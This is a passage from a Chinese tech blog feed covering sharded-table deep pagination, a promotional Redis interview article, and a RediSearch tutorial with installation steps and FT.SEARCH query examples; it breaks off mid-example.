</span><br><span class="line">335 10174 nick94  18  1641548939377  </span><br><span class="line">336 10129 nick85  18  1641548939442  </span><br><span class="line">337 10141 nick84  18  1641548939480  </span><br><span class="line">338 10096 nick74  18  1641548939668  </span><br><span class="line">  </span><br><span class="line">t2  </span><br><span class="line">334 10184 nick11  18  1641548945075  </span><br><span class="line">335 10109 nick93  18  1641548945382  </span><br><span class="line">336 10181 nick41  18  1641548945583  </span><br><span class="line">337 10130 nick80  18  1641548945993  </span><br><span class="line">338 10184 nick19  18  1641548946294  最大  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一遍的目标是啥，查出来的最小的 create_time 和最大的 create_time 找出来，然后再去三个表里查询，</p><p>其实主要是最小值，因为拿着最小值去查，就能知道这个最小值在每个表里处在什么位置，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">order by col between  col\_min and col\_i\_max;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来，将第一遍查出来的最小的 create_time 和最大的 create_time 找出来，然后再去三个表里查询，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">t0  </span><br><span class="line">322 10161 nick81  18  1641548939284  </span><br><span class="line">323 10113 nick16  18  1641548939393  </span><br><span class="line">324 10110 nick56  18  1641548939577  </span><br><span class="line">325 10116 nick69  18  1641548939588  </span><br><span class="line">326 10173 nick51  18  1641548939646  </span><br><span class="line">  </span><br><span class="line">t1  </span><br><span class="line">334 10105 nick98  18  1641548939071  </span><br><span class="line">335 10174 nick94  18  1641548939377  </span><br><span class="line">336 10129 nick85  18  1641548939442  </span><br><span class="line">337 10141 nick84  18  1641548939480  </span><br><span class="line">338 10096 nick74  18  1641548939668  </span><br><span class="line">  </span><br><span class="line">t2  </span><br><span class="line">297 10136 nick28  18  1641548939161  </span><br><span class="line">298 10142 nick68  18  1641548939177  </span><br><span class="line">299 10124 nick41  18  1641548939237  </span><br><span class="line">300 10148 nick87  18  1641548939510  </span><br><span class="line">301 10169 nick23  18  1641548939715  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里只贴了前五条数据，为了方便知道偏移量，每个分表都使用了自增主键，</p><p>我们可以看到前一次查询的最小值分别在其他两个表里的位置分别是 322-1 和 297-1，</p><p>那么，对于总体来说，这个时间的起始位置，应该是在 <code>322 - 1 + 334-1 + 297 - 1 = 951</code>，</p><p>那么，只要对后面的数据最多每个表查 <code>1000 - 951 + 5 = 54</code> 条数据，再进行合并排序就可以获得最终正确的结果。</p><p>这个就是的二次查询法。</p><p>可见，二次查询法很麻烦， 不如禁止跳页法，或者 es组合方法，直接，有效。</p><h2 id="优化方案3：使用-ES-HBASE-海量NOSQL架构方案"><a href="#优化方案3：使用-ES-HBASE-海量NOSQL架构方案" class="headerlink" title="优化方案3：使用 ES+HBASE 海量NOSQL架构方案"></a>优化方案3：使用 ES+HBASE 海量NOSQL架构方案</h2><p>对于海量数据场景，建议使用 ES+HBASE 这样的 海量NOSQL架构方案，具体如下：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMzYwODY3OQ==&mid=2247486355&idx=1&sn=11de825e254f07babb33ec0092023ca3&scene=21#wechat_redirect">100亿级数据存储架构：MYSQL双写 + HABSE +Flink +ES综合大实操</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247500949&idx=1&sn=7e54bb8171b421ddd980247e7b398efc&scene=21#wechat_redirect">阿里2面：万亿级消息，如何做存储设计？</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247502366&idx=1&sn=97516e427ed08dee1cdfce7c585f977f&scene=21#wechat_redirect"><strong>字节面试：百亿级存储，怎么设计？只是分库分表？</strong></a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247502246&idx=1&sn=2383a2bb532e3c41fca3f98bc698fa96&scene=21#wechat_redirect"><strong>100亿级任务调度篇：从0到1, 从入门到 XXLJOB 工业级使用</strong></a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247502412&idx=1&sn=36ba00af1baa36a759c15f14e365934a&scene=21#wechat_redirect"><strong>高并发搜索ES圣经：从0到1, 从入门到 ElasticSearch 工业级使用</strong></a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247502644&idx=1&sn=703bc8a56ba7466d13866498d41cc5e9&scene=21#wechat_redirect"><strong>超级底层：10WQPS&#x2F;PB级海量存储HBase&#x2F;RocksDB，底层LSM结构是什么？</strong></a></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度分页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Redis 杀疯了。。。</title>
      
      <link href="/2024/08/11/Redis-%E6%9D%80%E7%96%AF%E4%BA%86%E3%80%82%E3%80%82%E3%80%82/"/>
      <url>/2024/08/11/Redis-%E6%9D%80%E7%96%AF%E4%BA%86%E3%80%82%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>近些年面试，Redis都杀疯了。。。面试官都喜欢通过 Redis 来考察候选人对高性能、高并发系统的理解。你可能会遇到这样的情景：面试官突然问你，Redis 为什么这么快？</p><p><img src="/./2024/08/11/Redis-%E6%9D%80%E7%96%AF%E4%BA%86%E3%80%82%E3%80%82%E3%80%82/1.png"></p><p>又或者，问你如何在生产环境中优化 Redis 的性能。</p><p>但是如果你能从容不迫地回答，甚至能深入源码分析，那你离心仪的 Offer 就不远了。</p><p><em>—</em> <em>1</em> <em>—</em></p><p><strong>面试 Redis 的门道多着呢</strong></p><p>Redis 这玩意儿，性能强，玩法多，但要真想掌握它的精髓，光会用是不够的，得把它的底层摸透。尤其是在面试中，想要脱颖而出，你必须深入理解 Redis 的核心数据结构。动态字符串（SDS）和链表不仅是 Redis 的灵魂所在，更是面试官重点考察的内容。</p><p>如果你没仔细研究过 Redis 的源码，尤其是新版本的改进和优化，那在面试中肯定会被各种深坑绊倒。像字节跳动这种大厂，面试官考察你对新技术的掌握，绝不会轻易放过这些关键点，他们往往会从最难的地方下手，让你措手不及。</p><p><em>—</em> <em>2</em> <em>—</em></p><p>免费分享一套 Redis 源码解析</p><p><strong>免费分享一套 Redis 源码解析教程，27 篇文章</strong>，直击 Redis 核心，从基础到高级，逐步揭开它的底层实现。</p><h3 id="动态字符串与链表：Redis-的灵魂数据结构"><a href="#动态字符串与链表：Redis-的灵魂数据结构" class="headerlink" title="动态字符串与链表：Redis 的灵魂数据结构"></a>动态字符串与链表：Redis 的灵魂数据结构</h3><p>要想玩转 Redis，第一步你得了解它的基础数据结构——动态字符串（SDS）和链表。SDS 是 Redis 内部的字符串实现，比传统 C 字符串灵活，支持二进制安全、动态扩展，提升性能的同时，还避免了缓冲区溢出这种老掉牙的问题。链表则是 Redis 用来实现列表的基础，简单却高效，适合插入和删除操作频繁的场景。</p><h3 id="字典与跳跃表：Redis-高效查询的秘诀"><a href="#字典与跳跃表：Redis-高效查询的秘诀" class="headerlink" title="字典与跳跃表：Redis 高效查询的秘诀"></a>字典与跳跃表：Redis 高效查询的秘诀</h3><p>Redis 的字典（哈希表）和跳跃表，是它在高效数据存取方面的两大利器。字典用来实现哈希键的映射，简单粗暴，但性能爆表。而跳跃表则是一种基于概率的有序数据结构，比起平衡树实现更为简单且性能优异，Redis 的有序集合正是依赖它来实现的。</p><h3 id="整数集合与压缩列表：节省内存的利器"><a href="#整数集合与压缩列表：节省内存的利器" class="headerlink" title="整数集合与压缩列表：节省内存的利器"></a>整数集合与压缩列表：节省内存的利器</h3><p>在 Redis 追求性能的道路上，内存优化是绕不过去的坎。整数集合和压缩列表正是为了节省内存而生。整数集合用于存储小范围整数的集合，在保持操作高效的同时，还节省了大量内存。压缩列表则是一种紧凑型的数据结构，常用于保存小规模的有序数据，比如哈希键或有序集合的小型数据，最大程度减少了内存占用。</p><h3 id="键的过期处理策略：让-Redis-保持敏捷"><a href="#键的过期处理策略：让-Redis-保持敏捷" class="headerlink" title="键的过期处理策略：让 Redis 保持敏捷"></a>键的过期处理策略：让 Redis 保持敏捷</h3><p>Redis 之所以能在高并发环境下保持快速响应，过期键的处理策略功不可没。它采用惰性删除与定期删除相结合的方式，保证系统的稳定性与性能。过期键的处理细节直接影响到 Redis 的性能，而理解这些策略的源码实现，能让你更好地控制 Redis 的内存使用和系统负载。</p><h3 id="AOF-和-RDB-持久化：数据安全的双保险"><a href="#AOF-和-RDB-持久化：数据安全的双保险" class="headerlink" title="AOF 和 RDB 持久化：数据安全的双保险"></a>AOF 和 RDB 持久化：数据安全的双保险</h3><p>持久化是 Redis 的一大特色，AOF 和 RDB 各司其职，互为补充。AOF 是实时性更强的日志型持久化方式，记录每次写操作，保证即使 Redis 崩溃也能最大限度地恢复数据。而 RDB 则是定期保存数据快照，适合冷备份。理解这两者的源码实现，你就能根据需求合理配置持久化策略，做到性能和数据安全的平衡。</p><h3 id="网络框架与命令执行过程：高性能背后的秘密"><a href="#网络框架与命令执行过程：高性能背后的秘密" class="headerlink" title="网络框架与命令执行过程：高性能背后的秘密"></a>网络框架与命令执行过程：高性能背后的秘密</h3><p>Redis 的高并发处理能力，离不开它高效的网络框架。它采用单线程的 IO 多路复用机制，虽然简单，却足够高效。理解它的网络模型和事件驱动机制，是你优化 Redis 性能的关键。再看命令执行过程，Redis 通过一个指令缓冲区和命令表来解析和执行命令，这个过程简单但高效，源码解析会让你了解每一个指令背后的故事。</p><h3 id="主从复制与哨兵机制：高可用架构的基石"><a href="#主从复制与哨兵机制：高可用架构的基石" class="headerlink" title="主从复制与哨兵机制：高可用架构的基石"></a>主从复制与哨兵机制：高可用架构的基石</h3><p>Redis 能够在生产环境中大规模使用，主从复制和哨兵机制是它的功臣。主从复制保证了数据的冗余备份，哨兵机制则为 Redis 提供了自动故障转移的能力。通过源码解析，你可以深入理解它们的工作原理，掌握如何搭建一个高可用的 Redis 集群。</p><h3 id="Redis-集群：分布式存储的利器"><a href="#Redis-集群：分布式存储的利器" class="headerlink" title="Redis 集群：分布式存储的利器"></a>Redis 集群：分布式存储的利器</h3><p>当单机 Redis 无法满足你的需求时，Redis 集群就是你必备的武器。它通过分片存储和主从复制来保证数据的高可用性与扩展性。我们从集群的初始化、数据分片、节点间的通信与故障转移等方面进行深度解析，让你对 Redis 集群有一个全面的理解，并能根据实际需求灵活配置。</p><h3 id="Redis-事务与内存管理：提升应用的稳定性"><a href="#Redis-事务与内存管理：提升应用的稳定性" class="headerlink" title="Redis 事务与内存管理：提升应用的稳定性"></a>Redis 事务与内存管理：提升应用的稳定性</h3><p>Redis 事务虽然不像关系型数据库那么强大，但在某些场景下非常实用。了解它的事务实现及其局限性，可以让你更好地在实际项目中使用它。还有 Redis 的内存管理机制，比如 BIO 异步处理、内存碎片整理等，都关系到 Redis 的性能和稳定性。理解这些底层细节，让你在面对 Redis 性能瓶颈时，不会手足无措。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>换掉ES！Redis官方搜索引擎来了，性能炸裂！</title>
      
      <link href="/2024/08/11/%E6%8D%A2%E6%8E%89ES%EF%BC%81Redis%E5%AE%98%E6%96%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9D%A5%E4%BA%86%EF%BC%8C%E6%80%A7%E8%83%BD%E7%82%B8%E8%A3%82%EF%BC%81/"/>
      <url>/2024/08/11/%E6%8D%A2%E6%8E%89ES%EF%BC%81Redis%E5%AE%98%E6%96%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9D%A5%E4%BA%86%EF%BC%8C%E6%80%A7%E8%83%BD%E7%82%B8%E8%A3%82%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>RediSearch是一个Redis模块，为Redis提供查询、二次索引和全文搜索。要使用RediSearch，首先要在Redis数据上声明索引。然后可以使用重新搜索查询语言来查询该数据。RedSearch使用压缩的反向索引进行快速索引，占用内存少。RedSearch索引通过提供精确的短语匹配、模糊搜索和数字过滤等功能增强了</p><p><img src="/./2024/08/11/%E6%8D%A2%E6%8E%89ES%EF%BC%81Redis%E5%AE%98%E6%96%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9D%A5%E4%BA%86%EF%BC%8C%E6%80%A7%E8%83%BD%E7%82%B8%E8%A3%82%EF%BC%81/1.png"></p><h3 id="2、实现特性"><a href="#2、实现特性" class="headerlink" title="2、实现特性"></a>2、实现特性</h3><ul><li><p>基于文档的多个字段全文索引</p></li><li><p>高性能增量索引</p></li><li><p>文档排序（由用户在索引时手动提供）</p></li><li><p>在子查询之间使用 AND 或 NOT 操作符的复杂布尔查询</p></li><li><p>可选的查询子句</p></li><li><p>基于前缀的搜索</p></li><li><p>支持字段权重设置</p></li><li><p>自动完成建议（带有模糊前缀建议）</p></li><li><p>精确的短语搜索</p></li><li><p>在许多语言中基于词干分析的查询扩展</p></li><li><p>支持用于查询扩展和评分的自定义函数</p></li><li><p>将搜索限制到特定的文档字段</p></li><li><p>数字过滤器和范围</p></li><li><p>使用 Redis 自己的地理命令进行地理过滤</p></li><li><p>Unicode 支持（需要 UTF-8 字符集）</p></li><li><p>检索完整的文档内容或只是 ID 的检索</p></li><li><p>支持文档删除和更新与索引垃圾收集</p></li><li><p>支持部分更新和条件文档更新</p></li></ul><h2 id="对比-Elasticsearch"><a href="#对比-Elasticsearch" class="headerlink" title="对比 Elasticsearch"></a>对比 Elasticsearch</h2><p>如下图所示，RediSearch 构建索引的时间为 221 秒，而 Elasticsearch 为 349 秒，快了 58%。</p><p><img src="/./2024/08/11/%E6%8D%A2%E6%8E%89ES%EF%BC%81Redis%E5%AE%98%E6%96%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9D%A5%E4%BA%86%EF%BC%8C%E6%80%A7%E8%83%BD%E7%82%B8%E8%A3%82%EF%BC%81/2.png"></p><h2 id="索引构建测试"><a href="#索引构建测试" class="headerlink" title="索引构建测试"></a>索引构建测试</h2><p>我们模拟了一个多租户电子商务应用程序，其中每个租户代表一个产品类别并维护自己的索引。对于此基准测试，我们构建了 50K 个索引（或产品），每个索引最多存储 500 个文档（或项目），总共 2500 万个文档。RediSearch 仅用了 201 秒就构建了索引，平均每秒运行 125K 个索引。然而，Elasticsearch 在 921 个索引后崩溃了，显然它不是为应对这种负载而设计的。</p><p><img src="/./2024/08/11/%E6%8D%A2%E6%8E%89ES%EF%BC%81Redis%E5%AE%98%E6%96%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9D%A5%E4%BA%86%EF%BC%8C%E6%80%A7%E8%83%BD%E7%82%B8%E8%A3%82%EF%BC%81/3.png"></p><h2 id="查询性能测试"><a href="#查询性能测试" class="headerlink" title="查询性能测试"></a>查询性能测试</h2><p>一旦数据集被索引，我们就使用在专用负载生成器服务器上运行的 32 个客户端启动两个单词的搜索查询。如下图所示，RediSearch 吞吐量达到了 12.5K 操作&#x2F;秒，而 Elasticsearch 为 3.1K 操作&#x2F;秒，速度提高了 4 倍。此外，RediSearch 延迟稍好一些，平均为 8 毫秒，而 Elasticsearch 为 10 毫秒。</p><p><img src="/./2024/08/11/%E6%8D%A2%E6%8E%89ES%EF%BC%81Redis%E5%AE%98%E6%96%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9D%A5%E4%BA%86%EF%BC%8C%E6%80%A7%E8%83%BD%E7%82%B8%E8%A3%82%EF%BC%81/4.png"></p><h3 id="3、安装"><a href="#3、安装" class="headerlink" title="3、安装"></a>3、安装</h3><h4 id="3-1-源码安装"><a href="#3-1-源码安装" class="headerlink" title="3.1 源码安装"></a>3.1 源码安装</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/RediSearch/RediSearch.git  </span><br><span class="line">cd RediSearch # 进入模块目录  </span><br><span class="line">make setup  </span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-docker安装"><a href="#3-2-docker安装" class="headerlink" title="3.2 docker安装"></a>3.2 docker安装</h4><p>note: RediSearch的安装比较复杂原包无法进行编译操作所以我们使用docker安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -p 6379:6379 redislabs/redisearch:latest</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-3-判断是否安装成功"><a href="#3-3-判断是否安装成功" class="headerlink" title="3.3 判断是否安装成功"></a>3.3 判断是否安装成功</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:0&gt;module list  </span><br><span class="line">1) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;ReJSON&quot;  </span><br><span class="line">   3) &quot;ver&quot;  </span><br><span class="line">   4) &quot;20007&quot;</span><br><span class="line"></span><br><span class="line">2) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;search&quot;  </span><br><span class="line">   3) &quot;ver&quot;  </span><br><span class="line">   4) &quot;20209&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回数组存在“ft”或 “search”(不同版本)，表明 RediSearch 模块已经成功加载。</p><h2 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h2><h3 id="1、创建"><a href="#1、创建" class="headerlink" title="1、创建"></a>1、创建</h3><h4 id="1-1-创建索引"><a href="#1-1-创建索引" class="headerlink" title="1.1 创建索引"></a>1.1 创建索引</h4><blockquote><p>创建索引不妨想象成创建表结构,表一般基本属性有表名、字段和字段类别等，所以我们可以考虑将索引名代表表名，字段代表字段，属性即表示属性。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.create &quot;student&quot; schema &quot;name&quot; text weight 5.0 &quot;sex&quot; text &quot;desc&quot; text &quot;class&quot; tag  </span><br><span class="line">&quot;OK&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>student 表示索引名，name、sex、desc表示字段，text表示类型（这样表示只是为了便于理解）<br>“weight”为权重，默认值为 1.0</p><p>插播一条，如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 1万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术栈五百套套，精品系列教程，免费提供。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type student  </span><br><span class="line">&quot;none&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们创建的索引redis是不认识的，这证明使用的是插件。</p><h4 id="1-2-创建文档"><a href="#1-2-创建文档" class="headerlink" title="1.2 创建文档"></a>1.2 创建文档</h4><blockquote><p>创建文档上下文的过程不妨想想成向表中插入数据，这里请注意字段名可以使用双引号但切记一定要用英文，这里之所以着重提出是因为有些编译器中文双引号和英文双引号用肉眼实在难以辨认否则会出现<br>“Fields must be specified in FIELD VALUE pairs”（其实是将“ 当作内容处理了以至于缺少了<strong>字段</strong>）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.add student 001 1.0 language &quot;chinese&quot; fields name &quot;张三&quot; sex &quot;男&quot; desc &quot;这是一个学生&quot; class &quot;一班&quot;  </span><br><span class="line">&quot;OK&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中001为文档ID,”1.0”为评分缺少此值会报”Could not parse document score”异常<br>language 指明使用的语言默认是英文编码 如果没有此标记存储是没有问题的但<strong>不可以通过中文字符查询</strong></p><h4 id="1-3-查询"><a href="#1-3-查询" class="headerlink" title="1.3 查询"></a>1.3 查询</h4><h5 id="1-3-1-基本查询"><a href="#1-3-1-基本查询" class="headerlink" title="1.3.1 基本查询"></a>1.3.1 基本查询</h5><h6 id="1-3-1-1-全量查询"><a href="#1-3-1-1-全量查询" class="headerlink" title="1.3.1.1 全量查询"></a>1.3.1.1 全量查询</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;FT.SEARCH student * SORTBY sex desc RETURN 3 name sex desc  </span><br><span class="line">1) &quot;2&quot;  </span><br><span class="line">2) &quot;001&quot;  </span><br><span class="line">3) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;张三&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;</span><br><span class="line"></span><br><span class="line">4) &quot;002&quot;  </span><br><span class="line">5) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;张三&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="1-3-1-2-匹配查询"><a href="#1-3-1-2-匹配查询" class="headerlink" title="1.3.1.2 匹配查询"></a>1.3.1.2 匹配查询</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.search student &quot;张三&quot; limit 0 10 RETURN 3 name sex desc  </span><br><span class="line">1) &quot;2&quot;  </span><br><span class="line">2) &quot;001&quot;  </span><br><span class="line">3) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;张三&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;</span><br><span class="line"></span><br><span class="line">4) &quot;002&quot;  </span><br><span class="line">5) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;张三&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>limit 与mysql相识主要用于分页，此处是全量匹配，如果没有设置language “chinese” 此处查询为0，</p><h5 id="1-3-2-模糊匹配"><a href="#1-3-2-模糊匹配" class="headerlink" title="1.3.2 模糊匹配"></a>1.3.2 模糊匹配</h5><h6 id="1-3-2-1-后置匹配"><a href="#1-3-2-1-后置匹配" class="headerlink" title="1.3.2.1 后置匹配"></a>1.3.2.1 后置匹配</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ft.search student &quot;李*&quot;  SORTBY sex desc RETURN 3 name sex desc  </span><br><span class="line">1) &quot;1&quot;  </span><br><span class="line">2) &quot;003&quot;  </span><br><span class="line">3) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;李四&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="1-3-2-2-模糊搜索"><a href="#1-3-2-2-模糊搜索" class="headerlink" title="1.3.2.2 模糊搜索"></a>1.3.2.2 模糊搜索</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;FT.SEARCH beers &quot;%%张店%%&quot;  </span><br><span class="line">1) &quot;1&quot;  </span><br><span class="line">2) &quot;beer:1&quot;  </span><br><span class="line">3) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;集团本部已发布【文明就餐公约】，2号楼办公人员午餐的就餐时间是11:45~13:00，现经行政服务部进行抽查，发现我们部门有员工违规就餐现象。请大家务必遵守，相互转告，对于外地回到集团办公的同事，亦请遵守，谢谢！&quot;  </span><br><span class="line">   3) &quot;org&quot;  </span><br><span class="line">   4) &quot;山东省淄博市张店区&quot;  </span><br><span class="line">   5) &quot;school&quot;  </span><br><span class="line">   6) &quot;山东理工大学&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>别高兴太早全量模糊匹配是由很大限制的，他基于Levenshtein距离（LD）进行模糊匹配。术语的模糊匹配是通过在术语周围加“%”来实现的，模糊匹配的最大LD为3，<br>确切的说这只是一种相识度查询，并非一般意义上的模糊搜索，<br>但是：如果仔细观察会发现通过精确匹配时不仅能够将完整value值查询出来而且还查询出其他处于文档某个位置的key请看官方提供的一个例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FT.CREATE idx SCHEMA txt TEXT  </span><br><span class="line">FT.ADD idx docCn 1.0 LANGUAGE chinese FIELDS txt &quot;Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。从盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。[8]&quot;  </span><br><span class="line">FT.SEARCH idx &quot;数据&quot; LANGUAGE chinese HIGHLIGHT SUMMARIZE  </span><br><span class="line"># Outputs:  </span><br><span class="line"># &lt;b&gt;数据&lt;/b&gt;?... &lt;b&gt;数据&lt;/b&gt;进行写操作。由于完全实现了发布... &lt;b&gt;数据&lt;/b&gt;冗余很有帮助。[8...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之所以会出现这样的效果是因为redisearch对文本进行了分词，其使用的工具是friso相比es的ik还是弱一些前者主要是对中文分词，体积小可移植性强。<br>从而我们可以结合后后置匹配算法</p><p>插播一条，如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 1万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术栈五百套套，精品系列教程，免费提供。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;FT.SEARCH idx &quot;数*&quot; LANGUAGE chinese HIGHLIGHT  </span><br><span class="line">1) &quot;1&quot;  </span><br><span class="line">2) &quot;docCn&quot;  </span><br><span class="line">3) 1) &quot;txt&quot;  </span><br><span class="line">   2) &quot;Redis支持主从同步。&lt;b&gt;数据&lt;/b&gt;可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。从盘可以有意无意的对&lt;b&gt;数据&lt;/b&gt;进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和&lt;b&gt;数据&lt;/b&gt;冗余很有帮助。[8]&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者结合Levenshtein算法这样基本上能够满足业务查询需求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;FT.SEARCH idx &quot;%%单的树%%&quot; LANGUAGE chinese HIGHLIGHT  </span><br><span class="line">1) &quot;1&quot;  </span><br><span class="line">2) &quot;docCn&quot;  </span><br><span class="line">3) 1) &quot;txt&quot;  </span><br><span class="line">   2) &quot;Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层&lt;b&gt;树&lt;/b&gt;复制。从盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步&lt;b&gt;树&lt;/b&gt;时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。[8]&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="1-3-2-3-字段查询"><a href="#1-3-2-3-字段查询" class="headerlink" title="1.3.2.3 字段查询"></a>1.3.2.3 字段查询</h6><p>通过字段查询也可以实现模糊搜索，直接给例子，后面跟着官网上给的sql 和 redisearch的对照表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ft.search student *  </span><br><span class="line">1) &quot;2&quot;  </span><br><span class="line">2) &quot;doudou&quot;  </span><br><span class="line">3) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;豆豆&quot;  </span><br><span class="line">   3) &quot;jtzz&quot;  </span><br><span class="line">   4) &quot;“检索”是很多产品中&quot;  </span><br><span class="line">   5) &quot;phone&quot;  </span><br><span class="line">   6) &quot;18563717107&quot;</span><br><span class="line"></span><br><span class="line">4) &quot;ttao&quot;  </span><br><span class="line">5) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;姚元涛&quot;  </span><br><span class="line">   3) &quot;jtzz&quot;  </span><br><span class="line">   4) &quot;一个生病的人只&quot;  </span><br><span class="line">   5) &quot;phone&quot;  </span><br><span class="line">   6) &quot;18563717107&quot;  </span><br><span class="line">     </span><br><span class="line">ft.search student &#x27;@phone:185* @name:豆豆&#x27;  </span><br><span class="line">1) &quot;1&quot;  </span><br><span class="line">2) &quot;doudou&quot;  </span><br><span class="line">3) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;豆豆&quot;  </span><br><span class="line">   3) &quot;jtzz&quot;  </span><br><span class="line">   4) &quot;“检索”是很多产品中&quot;  </span><br><span class="line">   5) &quot;phone&quot;  </span><br><span class="line">   6) 